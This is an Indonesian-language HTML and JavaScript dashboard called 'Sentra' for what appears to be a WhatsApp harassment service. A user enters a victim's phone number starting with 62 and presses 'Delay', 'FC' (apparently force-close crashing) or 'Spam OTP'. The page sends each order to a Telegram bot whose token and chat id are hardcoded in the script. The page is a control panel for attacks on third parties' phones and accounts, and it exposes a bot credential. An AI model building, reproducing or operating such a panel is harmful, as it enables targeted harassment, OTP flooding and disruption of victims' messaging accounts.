<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard - Sentra</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-container">
    <h2 id="welcome">Selamat Datang!</h2>
    <input type="text" id="target" placeholder="Masukkan target (cth: 628xxxx)">
    <button onclick="sendCommand('delay')">Delay</button>
    <button onclick="sendCommand('fc')">FC</button>
    <button onclick="sendCommand('spam otp')">Spam OTP</button>
    <button onclick="logout()" style="background:#ff4d4d;color:white">Logout</button>
  </div>
  <script>
    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI";
    const chatId = "-4823701847"; // Ganti dengan chat_id grup / akun kamu

    function logout() {
      localStorage.removeItem("sentra_user");
      window.location.href = "index.html";
    }

    function sendCommand(cmd) {
      const target = document.getElementById("target").value.trim();
      const user = localStorage.getItem("sentra_user") || "Unknown";

      if (!target.startsWith("62")) {
        alert("Target harus dimulai dengan 62");
        return;
      }

      const message = `ðŸ‘¤ Menu: ${cmd.toUpperCase()}\nðŸ“± Target: ${target}\nðŸ‘¤ User: ${user}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).then(() => {
        alert("Terkirim!");
        document.getElementById("target").value = "";
      }).catch(err => {
        alert("Gagal mengirim.");
        console.error(err);
      });
    }

    window.onload = () => {
      const user = localStorage.getItem("sentra_user");
      if (!user) return window.location.href = "index.html";
      document.getElementById("welcome").innerText = `Selamat Datang, ${user}!`;
    }
  </script>
</body>
</html>
